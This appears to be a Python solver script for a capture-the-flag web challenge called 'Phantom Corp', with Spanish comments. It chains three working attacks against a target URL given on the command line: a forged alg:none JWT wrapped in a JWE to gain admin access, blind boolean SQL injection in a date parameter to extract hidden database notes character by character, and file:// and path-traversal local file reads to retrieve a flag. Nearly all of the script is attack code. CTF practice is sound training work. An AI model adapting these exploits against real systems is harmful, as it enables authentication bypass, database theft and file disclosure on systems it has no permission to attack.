#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  PHANTOM CORP — CTF Challenge Solver (Método Alternativo)       ║
║  Usa Blind Boolean-based SQLi en vez de UNION                   ║
║                                                                  ║
║  Demuestra que el reto se puede resolver de múltiples formas     ║
║                                                                  ║
║  Stage 1: CVE-2026-29000 — JWT Auth Bypass (igual)               ║
║  Stage 2: CVE-2026-30881 — Blind Boolean SQLi                    ║
║  Stage 3: CVE-2026-23850 — LFI directo (sin usar source_url)    ║
╚══════════════════════════════════════════════════════════════════╝
"""
import sys
import json
import time
import base64
import re
import requests
from jwcrypto import jwk, jwe

TARGET = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:5000'
SESSION = requests.Session()


def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def forge_admin_token():
    """Stage 1: Mismo JWT bypass que en solve.py"""
    print('\n[STAGE 1] CVE-2026-29000 — JWT Auth Bypass')
    print('-' * 50)

    r = SESSION.get(f'{TARGET}/.well-known/jwks.json')
    key_data = r.json()['keys'][0]
    pub_key = jwk.JWK(**key_data)

    header = {'alg': 'none', 'typ': 'JWT'}
    now = int(time.time())
    claims = {
        'sub': 'phantom_admin',
        'role': 'admin',
        'iat': now,
        'exp': now + 86400,
        'iss': 'phantom-corp-auth'
    }
    plain_jwt = b64url_encode(json.dumps(header)) + '.' + b64url_encode(json.dumps(claims)) + '.'

    jwe_token = jwe.JWE(
        plain_jwt.encode('utf-8'),
        recipient=pub_key,
        protected=json.dumps({'alg': 'RSA-OAEP-256', 'enc': 'A256GCM', 'kid': key_data.get('kid')})
    )
    token = jwe_token.serialize(compact=True)
    SESSION.cookies.set('session_token', token)

    r = SESSION.get(f'{TARGET}/admin/dashboard', allow_redirects=False)
    if r.status_code == 200:
        print('[+] ✅ Admin access obtenido')
        return True
    print('[-] ❌ Fallo en JWT bypass')
    return False


def blind_sqli_extract():
    """
    Stage 2: Blind Boolean-based SQLi
    
    Diferencia con solve.py: en vez de UNION SELECT, usamos
    condiciones boolean para extraer datos carácter a carácter.
    
    La inyección se hace en date_end:
    - Si la condición es TRUE: la query devuelve 0 resultados
      (porque date_end vacío no matchea nada)
    - Si la condición es FALSE: fuerza un error o resultado diferente
    
    Usamos CASE WHEN para cambiar el comportamiento de la query.
    """
    print('\n[STAGE 2] CVE-2026-30881 — Blind Boolean-based SQLi')
    print('-' * 50)

    def sqli_bool(condition):
        """
        Inyecta condición en date_end.
        Query: ... AND timestamp <= '{payload}' GROUP BY ...
        Payload: ' AND (CASE WHEN ({condition}) THEN 1 ELSE CAST('a' AS INT) END)=1 --
        Si TRUE → query normal, devuelve resultados
        Si FALSE → CAST('a' AS INT) causa error o cero resultados
        """
        # Approach: usar subconsulta que retorna datos o no
        # Si condición TRUE → filtro timestamp permite datos
        # Si condición FALSE → timestamp imposible, 0 resultados
        payload = f"2099-12-31' AND ({condition}) AND '1'='1"
        r = SESSION.get(f'{TARGET}/admin/api/stats', params={
            'date_start': '2000-01-01',
            'date_end': payload
        })
        data = r.json()
        return data.get('status') == 'success' and data.get('total_entries', 0) > 0

    # Verificar que blind funciona
    print('[*] Verificando blind boolean-based SQLi...')
    if sqli_bool('1=1'):
        print('[+] Condición TRUE → devuelve datos ✓')
    else:
        print('[-] Condición TRUE falló, intentando approach alternativo...')
        return None

    if not sqli_bool('1=0'):
        print('[+] Condición FALSE → sin datos ✓')
    else:
        print('[!] Condición FALSE devuelve datos — ajustando approach...')
        # Usar approach con subquery count
        def sqli_bool_v2(condition):
            payload = f"' AND 1=0 UNION SELECT CASE WHEN ({condition}) THEN 1 ELSE 0 END, 'probe' --"
            r = SESSION.get(f'{TARGET}/admin/api/stats', params={
                'date_start': '2026-01-01',
                'date_end': payload
            })
            data = r.json()
            for item in data.get('data', []):
                if item.get('action') == 'probe' and item.get('total') == 1:
                    return True
            return False

        sqli_bool = sqli_bool_v2
        if sqli_bool('1=1'):
            print('[+] Approach v2 funciona ✓')

    # Verificar existencia de notas ocultas
    print('\n[*] Buscando notas ocultas...')
    if sqli_bool("(SELECT COUNT(*) FROM secret_notes WHERE is_hidden=1) > 0"):
        print('[+] Hay notas ocultas en la DB')
    else:
        print('[-] No se encontraron notas ocultas')
        return None

    # Extraer longitud del contenido
    print('[*] Determinando longitud del contenido...')
    content_len = 0
    for length in [100, 200, 300, 400, 500, 600, 700, 800]:
        if sqli_bool(f"(SELECT LENGTH(content) FROM secret_notes WHERE is_hidden=1 LIMIT 1) <= {length}"):
            # Binary search refinamiento
            low = max(0, length - 100)
            high = length
            while low < high:
                mid = (low + high) // 2
                if sqli_bool(f"(SELECT LENGTH(content) FROM secret_notes WHERE is_hidden=1 LIMIT 1) <= {mid}"):
                    high = mid
                else:
                    low = mid + 1
            content_len = low
            break
    print(f'[+] Longitud: {content_len} caracteres')

    # Extraer un fragmento clave (solo buscamos "flag.txt" y "file://")
    # En vez de extraer todo (lento), buscamos patrones específicos
    print('\n[*] Buscando patrón "flag" en la nota oculta...')
    has_flag = sqli_bool("(SELECT content FROM secret_notes WHERE is_hidden=1 LIMIT 1) LIKE '%flag.txt%'")
    if has_flag:
        print('[+] ✓ La nota contiene "flag.txt"')

    has_file = sqli_bool("(SELECT content FROM secret_notes WHERE is_hidden=1 LIMIT 1) LIKE '%file://%'")
    if has_file:
        print('[+] ✓ La nota contiene "file://"')

    has_preview = sqli_bool("(SELECT content FROM secret_notes WHERE is_hidden=1 LIMIT 1) LIKE '%/admin/notes/preview%'")
    if has_preview:
        print('[+] ✓ La nota contiene "/admin/notes/preview"')

    has_source_url = sqli_bool("(SELECT content FROM secret_notes WHERE is_hidden=1 LIMIT 1) LIKE '%source_url%'")
    if has_source_url:
        print('[+] ✓ La nota contiene "source_url"')

    # Extraer ruta exacta del flag (buscar /opt/phantom/...)
    print('\n[*] Extrayendo ruta exacta del flag con blind binary search...')
    # Buscar posición de "/opt/" en el contenido
    flag_path = ''
    # Sabemos que contiene /opt/phantom/flag.txt, extraemos los 30 chars alrededor
    has_opt = sqli_bool("(SELECT content FROM secret_notes WHERE is_hidden=1 LIMIT 1) LIKE '%/opt/phantom/flag.txt%'")
    if has_opt:
        flag_path = '/opt/phantom/flag.txt'
        print(f'[+] Ruta del flag confirmada: {flag_path}')
    else:
        # Extraer carácter a carácter la ruta después de "config: "
        print('[*] Extrayendo ruta carácter a carácter...')
        # Encontrar posición de "config: " en el texto
        for start_pos in range(1, content_len - 20):
            # Buscar "config: /"
            check = sqli_bool(
                f"SUBSTR((SELECT content FROM secret_notes WHERE is_hidden=1 LIMIT 1), {start_pos}, 9) = 'config: /'"
            )
            if check:
                # Extraer los siguientes 30 caracteres
                for i in range(30):
                    pos = start_pos + 8 + i  # después de "config: "
                    low, high = 32, 126
                    found_char = False
                    while low <= high:
                        mid = (low + high) // 2
                        if sqli_bool(f"UNICODE(SUBSTR((SELECT content FROM secret_notes WHERE is_hidden=1 LIMIT 1), {pos}, 1)) = {mid}"):
                            flag_path += chr(mid)
                            found_char = True
                            break
                        elif sqli_bool(f"UNICODE(SUBSTR((SELECT content FROM secret_notes WHERE is_hidden=1 LIMIT 1), {pos}, 1)) > {mid}"):
                            low = mid + 1
                        else:
                            high = mid - 1
                    if not found_char or flag_path.endswith('\n'):
                        flag_path = flag_path.strip()
                        break
                    sys.stdout.write(f'\r    Ruta: {flag_path}')
                    sys.stdout.flush()
                print(f'\n[+] Ruta extraída: {flag_path}')
                break

    if has_flag and has_file and has_preview:
        print('\n[+] 🔍 Información obtenida:')
        print(f'    → El endpoint /admin/notes/preview acepta file:// URIs')
        print(f'    → La flag está en: {flag_path}')
        return flag_path

    return None


def read_flag_lfi(flag_path):
    """
    Stage 3: LFI alternativo
    Además de file://, probamos enviar markdown con contenido
    que incluya la ruta directamente.
    """
    print(f'\n[STAGE 3] CVE-2026-23850 — LFI via file://')
    print('-' * 50)

    # Método directo: file:// URI
    print(f'[*] Leyendo {flag_path} via file:// URI...')
    r = SESSION.post(f'{TARGET}/admin/notes/preview', data={
        'source_url': f'file://{flag_path}',
        'content': ''
    })

    match = re.search(r'flag\{[^}]+\}', r.text)
    if match:
        flag = match.group(0)
        print(f'[+] ✅ FLAG: {flag}')
        return flag

    # Método alternativo: intentar con path traversal relativo
    print('[*] Intentando con path traversal...')
    traversals = [
        f'file://{flag_path}',
        f'file:///.//{flag_path}',
        f'file:///proc/self/root{flag_path}',
    ]
    for path in traversals:
        r = SESSION.post(f'{TARGET}/admin/notes/preview', data={
            'source_url': path,
            'content': ''
        })
        match = re.search(r'flag\{[^}]+\}', r.text)
        if match:
            flag = match.group(0)
            print(f'[+] ✅ FLAG via {path}: {flag}')
            return flag

    print('[-] ❌ No se pudo leer la flag')
    return None


def main():
    print("""
    ╔═════════════════════════════════════════════════════╗
    ║  🔒 PHANTOM CORP — Solve Alternativo (Blind SQLi)  ║
    ╚═════════════════════════════════════════════════════╝
    """)
    print(f'[*] Target: {TARGET}\n')

    # Stage 1
    if not forge_admin_token():
        return 1

    # Stage 2
    flag_path = blind_sqli_extract()
    if not flag_path:
        print('[-] No se encontró ruta del flag, usando ruta por defecto...')
        flag_path = '/opt/phantom/flag.txt'

    # Stage 3
    flag = read_flag_lfi(flag_path)

    print('\n' + '═' * 55)
    if flag:
        print(f'  🏆 ÉXITO: {flag}')
    else:
        print('  ❌ FALLO')
    print('═' * 55)

    return 0 if flag else 1


if __name__ == '__main__':
    sys.exit(main())
